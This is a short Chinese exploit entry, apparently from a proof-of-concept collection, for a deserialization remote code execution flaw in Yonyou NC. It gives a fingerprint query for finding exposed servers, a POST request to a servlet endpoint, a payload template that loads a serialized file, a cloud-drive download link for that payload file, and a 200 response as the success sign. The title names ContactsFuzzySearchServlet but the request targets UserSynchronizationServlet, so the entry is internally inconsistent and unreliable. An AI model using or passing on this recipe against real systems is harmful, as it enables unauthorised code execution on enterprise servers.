# 用友NCContactsFuzzySearchServlet存在反序列化代码执行RCE漏洞

用友 ｜ 命令执行 ｜ —
- **指纹**：`app="用友-UFIDA-NC"`
- **请求**：`POST /servlet/UserSynchronizationServlet?pageId=login HTTP/1.1`

**Payload**
```
{{file(C:\path\path\payload.ser)}}
payload.ser文件下载链接：[https://pan.quark.cn/s/e21398dd0b16](https://pan.quark.cn/s/e21398dd0b16" \t "_blank)
```
- **响应特征**：200